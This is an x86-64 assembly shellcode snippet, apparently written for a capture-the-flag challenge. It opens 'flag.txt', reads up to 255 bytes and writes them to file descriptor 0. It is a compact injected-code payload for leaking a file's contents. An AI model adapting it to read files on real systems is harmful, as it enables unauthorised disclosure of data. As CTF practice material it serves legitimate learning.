global _start

section .text
_start:
	
	; open file
	xor rax, rax
	push rax
	push 0x67616c66					; flag
	mov dword [rsp+4], 0x7478742e	; .txt
	mov rdi, rsp					; [$rdi]: null terminated flag
	mov al, 0x2						; syscall open
	syscall


	; read file
	mov rdi, rax					; move file pointer into rdi
	xor rax, rax
	push rax						; add space on stack
	push 0xff
	mov rsi, rsp					; move 255 byte buffer into rsi
	mov r12, rsp					; save buffer that contents are read into
	mov dl, 0xff					; read 255 bytes into rdx
	xor rax, rax
	syscall	

	; write contents
	xor rdi, rdi					; write to fd 0
	mov rsi, r12					; move buffer contents to rsi
	mov dl, 0xff					; write 255 bytes
	mov al, 0x1
	syscall

